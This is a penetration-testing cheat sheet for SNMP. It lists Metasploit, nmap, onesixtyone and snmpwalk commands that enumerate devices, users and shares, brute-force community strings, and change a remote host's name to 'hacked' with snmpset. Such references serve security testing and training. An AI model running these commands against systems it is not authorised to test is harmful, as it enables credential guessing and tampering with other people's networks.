The SNMP service listens by default on `161/udp`. 
SNMP versions 1,2,1.2C has no traffic encryption.

There are three community strings for SNMPv1-v2c-speaking devices: 
- SNMP Read-only community string - enables a remote device to retrieve "read-only" information from a device. Intermapper uses this information from devices on its maps.
- SNMP Read-Write community string - used in requests for information from a device and to modify settings on that device. Intermapper does not use the read-write community string, since it never attempts to modify any settings on its devices.
- SNMP Trap community string - included when a device sends SNMP Traps to Intermapper. Intermapper accepts any SNMP Trap community string.

## Reading MIB database 

### SNMP Network Discovery

```bash
msf> use auxiliary/scanner/snmp/snmp_enum 
msf auxiliary(snmp_enum) > set RHOSTS 10.11.1.1-254 
msf auxiliary(snmp_enum) > set THREADS 10 
msf auxiliary(snmp_enum) > run
```

### List of SNMP Metasploit Scripts

```bash
msf> use auxiliary/scanner/snmp/snmp_enum 
msf> use auxiliary/scanner/snmp/snmp_enumshares 
msf> use auxiliary/scanner/snmp/snmp_enumusers 
msf> use auxiliary/scanner/snmp/snmp_login
```

### nmap

```bash
nmap -p161 -sU -sC --script snmp* jd.acme.local
```

### Bruteforcing SNMP

```bash
nmap -sU 10.11.1.22 -p161 --script=snmp-brute -Pn --script-args snmp-brute.communitiesdb=snmp-default.txt
```

### Changing the hostname of a remote server 

```bash
snmpset -v 2c -c public 10.11.1.22 .1.3.6.1.2.1.1.5.0 s hacked
```

### Querying MIB values

```bash
snmpwalk -c public -v1 10.11.1.219
```

```bash
snmpenum
```

```bash
onesixtyone -c ../wordlist/snmp-community.txt -i ./snmp-hosts.txt
```

```bash
snmp-check 10.11.1.13 --timeout 2
```
